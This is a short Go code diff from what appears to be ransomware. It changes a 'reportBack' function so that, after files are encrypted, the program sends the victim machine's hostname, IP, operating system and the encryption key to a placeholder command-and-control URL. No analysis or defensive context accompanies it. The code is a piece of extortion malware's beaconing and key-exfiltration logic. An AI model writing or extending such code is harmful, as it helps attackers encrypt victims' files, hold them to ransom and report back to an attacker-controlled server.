@@ -9,6 +9,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"net/url"
 )
 
 const C2ServerUrl = "__C2_SERVER_URL__"
@@ -68,7 +69,20 @@ func processFiles() {
 }
 
 func reportBack() {
-	resp, err := http.Get(C2ServerUrl + "?status=encrypted")
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "Unknown-PC"
+	}
+
+	data := url.Values{}
+	data.Set("hostname", hostname)
+	data.Set("ip_address", "192.168.1.100")
+	data.Set("os", "Windows")
+	data.Set("encryption_key", "0123456789abcdef0123456789abcdef")
+	data.Set("encryption_type", "AES")
+	data.Set("status", "encrypted")
+
+	resp, err := http.PostForm(C2ServerUrl, data)
 	if err == nil {
 		resp.Body.Close()
 	}
